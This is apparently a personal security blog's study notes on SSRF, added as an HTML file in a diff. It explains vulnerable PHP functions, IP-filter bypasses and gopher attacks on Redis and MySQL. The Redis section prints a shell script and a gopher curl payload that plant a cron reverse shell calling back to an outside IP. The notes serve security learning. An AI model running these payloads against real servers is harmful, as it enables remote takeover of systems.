@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>安全牛SSRF学习笔记 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="安全牛SSRF学习笔记" />
+<meta property="og:description" content="0x00 SSRF介绍 SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。对外发起网络请求的地方都" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-08T02:41:00+00:00" />
+<meta property="article:modified_time" content="2021-04-08T02:41:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="安全牛SSRF学习笔记"/>
+<meta name="twitter:description" content="0x00 SSRF介绍 SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。对外发起网络请求的地方都"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-04-04-xss-labs/" /><link rel="next" href="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "安全牛SSRF学习笔记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/"
+        },"genre": "posts","keywords": "Web安全, CTF","wordcount":  2227 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\/","datePublished": "2021-04-08T02:41:00+00:00","dateModified": "2021-04-08T02:41:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">安全牛SSRF学习笔记</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>学习</a>&nbsp;<a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-04-08">2021-04-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2227 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-ssrf介绍">0x00 SSRF介绍</a></li>
+    <li><a href="#0x01-相关php函数">0x01 相关php函数</a></li>
+    <li><a href="#0x02-ip限制绕过及gopher对redis的利用">0x02 ip限制绕过及gopher对redis的利用</a></li>
+    <li><a href="#0x03-gopher对mysql的利用">0x03 Gopher对Mysql的利用</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-ssrf介绍">0x00 SSRF介绍</h2>
+<p>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。对外发起网络请求的地方都可能存在SSRF漏洞。</p>
+<p>SSRF的危害：</p>
+<ol>
+<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息</li>
+<li>攻击运行在内网或本地的应用程序（比如溢出）</li>
+<li>对内网Web应用进行指纹识别，通过访问默认文件实现</li>
+<li>攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</li>
+<li>利用File协议读取本地文件</li>
+</ol>
+<p>漏洞判断:</p>
+<ul>
+<li>回显</li>
+<li>延时</li>
+<li>DNS请求</li>
+</ul>
+<h2 id="0x01-相关php函数">0x01 相关php函数</h2>
+<p><code>file_get_contents</code> — 将整个文件读入一个字符串。如果要打开有特殊字符的 URL （比如说有空格），就需要进行 URL 编码。</p>
+<p>范例：</p>
+<pre class="wp-block-code"><code>&lt;?php
+if (isset($_POST&#91;'ur1']))
+{
+	$content= file_get_contents($_POST&#91;'url']);
+	$filename ='./images/'.rand().'jpg';
+	file_ put_contents($filename,$content);
+	echo $_POST&#91;'url'];
+	$img ="&lt;img src=\"".$filename."\"/>"；
+	echo $img;
+}
+else
+{
+	echo"no url";
+}
+?></code></pre>
+<p><code>fsockopen</code> — 打开一个网络连接或者一个Unix套接字连接。初始化一个套接字连接到指定主机（<code>hostname</code>）。</p>
+<p>范例：</p>
+<pre class="wp-block-code"><code>&lt;?php
+$url = $_POST&#91;'url'];
+$port = $_POST&#91;'port'];
+$fp = fsockopen($url, $port, $errno, $errstr,30);
+if(!$fp){
+	echo "$errstr($errno)&lt;br />\n";
+}
+else{
+	$out = "GET / HTTP/1.1\r\n";
+	$out .= "Host:www.example.com\r\n";
+	$out .= "Connection: Close\r\n\r\n";
+	fwrite($fp, $out);
+	while(!feof($fp)){
+		echo fgets($fp, 128);
+	}	
+	fclose($fp);
+}
+
+#url=127.0.0.1&port=3308
+?></code></pre>
+<p><code>curl_exec</code> — 执行 cURL 会话</p>
+<p>phpinfo中curl-protocols会显示支持的协议有哪些。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="949" height="371" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-205.png" alt="" class="wp-image-3128" /> </figure></p>
+<h2 id="0x02-ip限制绕过及gopher对redis的利用">0x02 ip限制绕过及gopher对redis的利用</h2>
+<p>绕过技巧</p>
+<pre class="wp-block-code"><code>添加端口//127.0.0.1:80
+
+短网址//例如在http://45.xcyqz.cn/试验
+
+指向任意IP的域名,比如：xip.io、sslip.io、nip.io、
+
+不同进制组合转换
+//127.0.0.1-->八进制0177.0.0.1-->十六进制0x7f.0.0.1/0x7f000001-->十进制2130706433</code></pre>
+<p>gopher是一个互联网上使用的分布型的文件搜集获取网络协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议。（俗称万能协议）</p>
+<p>gopher协议的格式：<code>gopher://host:port/_+数据流</code></p>
+<ol>
+<li>如果不指定端口，默认端口为70端口</li>
+<li>数据流要求全部进行url编码，并且以\r\n换行也就说以%0D%0A换行</li>
+</ol>
+<p><strong>Gopher对Redis的利用</strong></p>
+<p>Redis是一个key-value存储系统,支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set &ndash;有序集合)和hash（哈希类型）。这些数据类型都支持<code>push/pop</code>、<code>add/remove</code>及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，Redis支持各种不同方式的排序。为了保证效率，数据都是缓存在内存中。Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。参考<a href="https://www.cnblogs.com/twosmi1e/p/13308682.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.cnblogs.com/twosmi1e/p/13308682.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/twosmi1e/p/13308682.html</a></a></p>
+<p>常用命令</p>
+<pre class="wp-block-code"><code>      set testkey "Hello World"         # 设置键testkey的值为字符串Hello World
+      get testkey                       # 获取键testkey的内容
+      SET score 99                      # 设置键score的值为99
+      INCR score                        # 使用INCR命令将score的值增加1
+      GET score                         # 获取键score的内容
+      keys *                            # 列出当前数据库中所有的键
+      get anotherkey                    # 获取一个不存在的键的值
+      config set dir /home/test         # 设置工作目录
+      config set dbfilename redis.rdb   # 设置备份文件名
+      config get dir                    # 检查工作目录是否设置成功
+      config get dbfilename             # 检查备份文件名是否设置成功
+      save                              # 进行一次备份操作
+      flushall                          # 删除所有数据
+      del key                           # 删除键为key的数据
+
+Redis是不区分命令的大小写的，当尝试获取一个不存在的键的值时，Redis会返回空，即(nil)。</code></pre>
+<p>利用条件Redis没有密码</p>
+<ol>
+<li>首先在crontab里写定时任务，反弹shell，<code>bash -i &gt;&amp;</code> 表示创建一个交互式的bash shell到，<code>/dev/tcp/xxx</code>是一个特殊的文件，凡是尝试对该文件读或者写的操作，都会导致该文件发起一个socket连接，<code>/dev/tcp/ip地址/端口</code> 相当于创建了一个tcp套接字去连接IP地址:端口。<code>0&gt;&amp;1</code> 表示将标准输入重定向到文件描述符为1的文件中，即将标准输入重定向到标准输出；</li>
+<li>配置数据库文件夹路径，每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面。</li>
+<li>设置数据库文件名为root</li>
+<li>备份</li>
+<li>退出<figure class="wp-block-image size-full"></li>
+</ol>
+<p><img loading="lazy" width="1217" height="310" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-206.png" alt="" class="wp-image-3135" /> </figure></p>
+<p>Shell脚本：</p>
+<pre class="wp-block-code"><code>echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/106.12.37.37/2333 0>&1\n\n"|redis-cli -h $1 -p 
+$2 -x set 1 
+redis-cli -h $1 -p $2 config set dir /var/spool/cron/ 
+redis-cli -h $1 -p $2 config set dbfilename root 
+redis-cli -h $1 -p $2 save
+redis-cli -h $1 -p $2 quit
+
+-h 服务器地址 -p 端口号</code></pre>
+<p>比如说中间人端口为4444，启动中间人代理，<code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></p>
+<p>格式转换脚本<figure class="wp-block-image is-resized"></p>
+<p><img loading="lazy" src="https://img-blog.csdnimg.cn/20210213150653418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQxNTY0NA==,size_16,color_FFFFFF,t_70" alt="" width="575" height="520" /> </figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -v &#39;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a %0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d% 0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0 aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0 d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度</p>
+<p>需要注意的是，如果要换IP和端口，前面的$58也需要更改，$58表示字符串长度 为58个字节，上面的EXP即是%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a，3+51+4=58。如果想换成 42.256.24.73，那么$58需要改成$61，以此类推就行。</p>
+<h2 id="0x03-gopher对mysql的利用">0x03 Gopher对Mysql的利用</h2>
+<p>利用条件：Mysql 无密码</p>
+<p>常规操作：登入数据库-&gt;获取数据<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1496" height="493" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-207.png" alt="" class="wp-image-3149" /> </figure></p>
+<p>协议转化:</p>
+<pre class="wp-block-code"><code>gopher://127.0.0.1:3306/_ 
++url编码的登录请求
++包长度
++%00%00%00%03
++查询语句(url编码)
++%01%00%00%00%01</code></pre>
+<p>请求的接口：curl（绕过系统，命令执行）、php-curl（ssrf）。</p>
+<p>工具：<a href="https://hub.fastgit.org/tarunkant/Gopherus" target="_blank"  rel="nofollow" ><a href="https://hub.fastgit.org/tarunkant/Gopherus" target="_blank" rel="noopener noreffer ">https://hub.fastgit.org/tarunkant/Gopherus</a></a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-04-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛SSRF学习笔记" data-hashtags="Web安全,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛SSRF学习笔记"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛SSRF学习笔记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9Bssrf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛SSRF学习笔记"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-04-04-xss-labs/" class="prev" rel="prev" title="XSS-Labs"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>XSS-Labs</a>
+            <a href="/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="next" rel="next" title="安全牛反序列化学习笔记">安全牛反序列化学习笔记<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
